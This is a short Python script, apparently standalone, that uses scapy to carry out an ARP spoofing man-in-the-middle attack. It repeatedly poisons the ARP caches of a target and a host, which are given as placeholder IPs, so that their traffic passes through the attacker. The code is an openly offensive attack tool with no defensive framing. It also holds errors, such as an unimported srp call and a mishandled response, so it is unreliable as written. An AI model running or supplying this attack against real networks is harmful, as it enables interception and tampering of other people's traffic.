import time
from scapy.all import ARP, send, Ether, sniff, conf

# Set the network interface
conf.iface = 'eth0'

# Turn off output
conf.verb = 0

def get_mac(ip):
    """
    Returns the MAC address for the given IP address
    """
    # ARP request to get the MAC
    request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    response = srp(request, timeout=2, retry=10)

    # return the MAC from the response
    for _, r in response:
        return r[Ether].src

    return None

def arp_spoof(target_ip, host_ip):
    """
    Perform ARP spoofing
    """
    # Get the MAC address of the target
    target_mac = get_mac(target_ip)

    # Craft the ARP spoof packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response)

def main():
    try:
        while True:
            # Spoof the ARP table to become the man in the middle
            # between the target and the host
            arp_spoof('<target-ip>', '<host-ip>')
            arp_spoof('<host-ip>', '<target-ip>')

            # Sleep before the next spoof
            time.sleep(5)

    except KeyboardInterrupt:
        print('Stopping the attack')
        return

if __name__ == '__main__':
    main()
